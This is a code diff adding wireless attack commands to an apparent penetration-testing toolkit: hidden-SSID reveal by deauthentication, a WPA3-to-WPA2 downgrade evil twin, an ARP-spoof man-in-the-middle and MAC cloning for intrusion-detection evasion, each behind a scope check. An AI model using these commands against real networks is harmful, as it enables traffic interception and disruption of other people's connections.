@@ -590,6 +590,209 @@ def wifi_enterprise(
         pass
 
 
+@wifi_app.command("hidden")
+def wifi_hidden(
+    interface: str = typer.Argument(..., help="Monitor-mode interface"),
+    bssid: str = typer.Argument(..., help="Target (hidden) AP BSSID"),
+    channel: int = typer.Argument(..., help="Target channel"),
+    wordlist: str = typer.Option(
+        None, "--wordlist", "-w", help="Probe this SSID wordlist (mdk4) not deauth"
+    ),
+):
+    """Reveal a cloaked ESSID: deauth clients (default) or probe a wordlist."""
+
+    async def run_hidden():
+        from netreaper.core.exceptions import TargetValidationError
+        from netreaper.wireless.advanced import HiddenSSIDReveal
+
+        reveal = HiddenSSIDReveal()
+        try:
+            if wordlist:
+                await reveal.reveal_by_probe(interface, bssid, wordlist)
+                console.print(
+                    "[cyan]Probe sweep done. Watch a scan for the revealed SSID.[/cyan]"
+                )
+            else:
+                essid = await reveal.reveal_by_deauth(interface, bssid, channel)
+                if essid:
+                    console.print(f"[green]Revealed SSID: {essid}[/green]")
+                else:
+                    console.print(
+                        "[yellow]SSID stayed hidden (no clients/cloaked).[/yellow]"
+                    )
+                    raise typer.Exit(1)
+        except TargetValidationError as exc:
+            console.print(f"[red]Denied by scope gate: {exc}[/red]")
+            raise typer.Exit(2) from exc
+        except FileNotFoundError as exc:
+            console.print(f"[red]{exc}[/red]")
+            raise typer.Exit(2) from exc
+
+    asyncio.run(run_hidden())
+
+
+@wifi_app.command("wpa3")
+def wifi_wpa3(
+    interface: str = typer.Argument(..., help="Monitor-mode interface"),
+    bssid: str = typer.Argument(..., help="Target AP BSSID"),
+    timeout: int = typer.Option(15, "--timeout", "-t", help="Scan window (seconds)"),
+):
+    """Classify an AP's security (WPA3/SAE, OWE, ...) and advise on Dragonblood."""
+
+    async def run_wpa3():
+        from netreaper.core.exceptions import TargetValidationError
+        from netreaper.wireless.advanced import classify_security, dragonblood_advisory
+        from netreaper.wireless.scan import scan_networks
+
+        console.print(f"[cyan]Scanning {interface} for {timeout}s...[/cyan]")
+        try:
+            result = await scan_networks(interface, duration=timeout)
+        except TargetValidationError as exc:
+            console.print(f"[red]Denied by scope gate: {exc}[/red]")
+            raise typer.Exit(2) from exc
+        ap = result.find_ap(bssid)
+        if ap is None:
+            console.print(f"[yellow]{bssid} not seen in the scan.[/yellow]")
+            raise typer.Exit(1)
+        sec = classify_security(ap)
+        console.print(f"[green]{bssid} security: {sec.upper()}[/green]")
+        if sec == "wpa3":
+            console.print(dragonblood_advisory().render())
+
+    asyncio.run(run_wpa3())
+
+
+@wifi_app.command("downgrade")
+def wifi_downgrade(
+    interface: str = typer.Argument(..., help="Interface for the WPA2 twin"),
+    ssid: str = typer.Argument(..., help="SSID to clone (WPA3 transition target)"),
+    channel: int = typer.Argument(..., help="Channel (band derived from it)"),
+    passphrase: str = typer.Option(
+        "12345678", "--passphrase", "-p", help="WPA2 passphrase for the twin"
+    ),
+):
+    """WPA2-only twin to downgrade a WPA3 transition-mode AP; Ctrl-C to tear down."""
+
+    async def run_dg():
+        from netreaper.core.exceptions import TargetValidationError
+        from netreaper.wireless.advanced import WPA3Downgrade
+
+        dg = WPA3Downgrade()
+        try:
+            try:
+                await dg.start(interface, ssid, channel, passphrase=passphrase)
+            except TargetValidationError as exc:
+                console.print(f"[red]Denied by scope gate: {exc}[/red]")
+                raise typer.Exit(2) from exc
+            console.print(
+                f"[green]WPA2 downgrade twin '{ssid}' up on {interface} "
+                f"(ch {channel}). Press Ctrl-C to stop.[/green]"
+            )
+            while True:
+                await asyncio.sleep(3600)
+        except (KeyboardInterrupt, asyncio.CancelledError):
+            pass
+        finally:
+            if dg.state is not None:
+                await dg.stop()
+                console.print("[cyan]Downgrade twin torn down.[/cyan]")
+
+    try:
+        asyncio.run(run_dg())
+    except KeyboardInterrupt:
+        pass
+
+
+@wifi_app.command("arpspoof")
+def wifi_arpspoof(
+    interface: str = typer.Argument(..., help="Interface on the target LAN"),
+    gateway: str = typer.Argument(..., help="Gateway IP"),
+    target: str = typer.Argument(..., help="Victim client IP"),
+):
+    """Bypass client isolation with a bidirectional ARP-spoof MITM; Ctrl-C to stop."""
+
+    async def run_arp():
+        from netreaper.core.exceptions import TargetValidationError
+        from netreaper.wireless.advanced import ArpSpoof, check_isolation
+
+        spoof = ArpSpoof()
+        try:
+            try:
+                if await check_isolation(target):
+                    console.print(
+                        "[yellow]Target already reachable (no isolation). "
+                        "Spoofing anyway.[/yellow]"
+                    )
+                await spoof.start(interface, gateway, target)
+            except TargetValidationError as exc:
+                console.print(f"[red]Denied by scope gate: {exc}[/red]")
+                raise typer.Exit(2) from exc
+            console.print(
+                f"[green]ARP spoof {gateway} <-> {target} on {interface}. "
+                "Press Ctrl-C to stop.[/green]"
+            )
+            while True:
+                await asyncio.sleep(3600)
+        except (KeyboardInterrupt, asyncio.CancelledError):
+            pass
+        finally:
+            if spoof.state is not None:
+                await spoof.stop()
+                console.print("[cyan]ARP spoof torn down.[/cyan]")
+
+    try:
+        asyncio.run(run_arp())
+    except KeyboardInterrupt:
+        pass
+
+
+@wifi_app.command("mac-random")
+def wifi_mac_random(
+    interface: str = typer.Argument(..., help="Wireless interface"),
+    vendor: str = typer.Option(
+        "random", "--vendor", help="OUI vendor: apple, samsung, intel, realtek, random"
+    ),
+):
+    """Randomise the adapter MAC (WIDS evasion)."""
+
+    async def run_r():
+        from netreaper.core.exceptions import TargetValidationError
+        from netreaper.wireless.advanced import randomize_mac
+
+        try:
+            mac = await randomize_mac(interface, vendor=vendor)
+        except TargetValidationError as exc:
+            console.print(f"[red]Denied: {exc}[/red]")
+            raise typer.Exit(2) from exc
+        console.print(f"[green]MAC on {interface} -> {mac}[/green]")
+
+    asyncio.run(run_r())
+
+
+@wifi_app.command("mac-clone")
+def wifi_mac_clone(
+    interface: str = typer.Argument(..., help="Wireless interface"),
+    bssid: str = typer.Argument(..., help="AP BSSID to clone"),
+    channel: int = typer.Argument(..., help="Channel to match"),
+):
+    """Clone a legitimate AP's BSSID + channel onto the adapter (WIDS evasion)."""
+
+    async def run_c():
+        from netreaper.core.exceptions import TargetValidationError
+        from netreaper.wireless.advanced import clone_ap_mac
+
+        try:
+            mac = await clone_ap_mac(interface, bssid, channel)
+        except TargetValidationError as exc:
+            console.print(f"[red]Denied: {exc}[/red]")
+            raise typer.Exit(2) from exc
+        console.print(
+            f"[green]{interface} now cloning {mac} on channel {channel}[/green]"
+        )
+
+    asyncio.run(run_c())
+
+
 # Plugin commands
 plugin_app = typer.Typer(help="Plugin management")
 app.add_typer(plugin_app, name="plugin")
